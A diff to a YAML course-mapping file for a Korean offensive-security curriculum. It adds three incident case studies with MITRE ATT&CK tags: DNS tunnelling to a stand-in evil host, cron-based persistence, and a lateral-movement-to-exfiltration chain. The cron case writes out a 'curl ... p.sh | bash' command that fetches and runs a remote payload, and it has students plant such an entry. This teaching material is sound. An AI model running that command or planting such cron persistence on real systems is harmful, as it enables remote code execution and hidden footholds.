@@ -66,6 +66,18 @@ mappings:
     labs:
       - {course: attack, week: 6, version: nonai, role: primary, note: "Network Attacks — ARP/MITM/스니핑"}
       - {course: attack, week: 6, version: ai, role: primary}
+    case_study:
+      title: "DNS 터널링 — base32 페이로드 (실제 incident)"
+      narrative: |
+        2024-08-22 22:47, 내부 호스트 10.20.30.80 → ns.evil.example 으로 비정상 길이
+        DNS 쿼리 1,247건. subdomain 패턴이 [a-z2-7]{40,60} 의 base32 인코딩.
+        2시간 25분간 지속 후 자동 종료 (예약 작업으로 추정). UDP/53 정상 트래픽
+        뒤에 숨어 IDS·방화벽 통과.
+      mitre: ["T1071.004", "T1048.003"]
+      anchor_id: anc-3564198ef1bc
+      relevance: "패킷 분석 시 정상 DNS 와 base32 인코딩 subdomain 의 *길이 분포* 차이를
+                 직접 관찰. 이 사례는 IPS 우회 (w10) 와 함께 학습 가치 큼."
+      source: "Precinct 6 incident-2024-08-003"
 
   - week: 10
     lecture: {course: course1-attack, title: "IPS·방화벽 우회"}
@@ -86,6 +98,18 @@ mappings:
       - {course: attack, week: 9, version: nonai, role: primary, note: "Persistence — cron/SSH key/service"}
       - {course: attack, week: 12, version: nonai, role: bonus, note: "Evasion — 안티포렌식 일부 다룸"}
       - {course: attack, week: 9, version: ai, role: primary}
+    case_study:
+      title: "Linux cron + curl downloader — 5분 주기 재진입"
+      narrative: |
+        침해된 웹 서버(10.20.30.80)에서 /etc/cron.d/ 에 신규 항목 발견.
+        매 5분마다 `curl http://203.0.113.42/p.sh | bash` 실행하여
+        외부 페이로드 재다운로드. 파일은 디스크에 영구 저장 X (메모리 실행),
+        cron entry 자체만 흔적. 파일 크기·해시 기반 AV 무효.
+      mitre: ["T1053.003", "T1105"]
+      anchor_id: anc-bf23b0106fe4
+      relevance: "지속성 메커니즘 중 가장 흔한 패턴. 학생이 직접 cron entry 를 등록하고,
+                 fileless 실행으로 안티포렌식 효과 확인."
+      source: "Precinct 6 incident-2024-08-005"
 
   - week: 13
     lecture: {course: course1-attack, title: "MITRE ATT&CK 종합 매핑"}
@@ -93,6 +117,19 @@ mappings:
       - {course: attack, week: 10, version: nonai, role: primary, note: "Lateral Movement — TA0008 매핑"}
       - {course: attack, week: 11, version: nonai, role: primary, note: "Data Exfiltration — TA0010 매핑"}
       - {course: attack, week: 13, version: nonai, role: bonus, note: "Wireless — 보너스 도메인"}
+    case_study:
+      title: "SMB 측면이동 + AS-REP roasting + DNS 터널링 — 3 단계 chain"
+      narrative: |
+        2024-08-12: 자격 john.doe → SMB 인증 5 호스트 (T1021.002 + T1078).
+        3일 후 win-dc01 에서 PreAuthFlag=False 계정 3건 식별, AS-REP 응답이
+        198.51.100.42 로 유출 (T1558.004). 10일 후 동일 인프라에서
+        DNS 터널링으로 데이터 반출 (T1071.004 + T1048.003). Initial Access
+        부터 Exfiltration 까지 3주에 걸친 단일 캠페인.
+      mitre: ["T1021.002", "T1078", "T1558.004", "T1071.004", "T1048.003"]
+      anchor_id: anc-eca1db9a5a31
+      relevance: "ATT&CK 매트릭스 강의에서 *실제 chain* 사례. 단일 incident 가 어떻게
+                 여러 tactic 을 거치는지 1건으로 시연. 매핑 실습 대상."
+      source: "Precinct 6 incident-2024-08-001 + 002 + 003"
 
   - week: 14
     lecture: {course: course1-attack, title: "Bastion 자연어 자동 침투 테스트"}
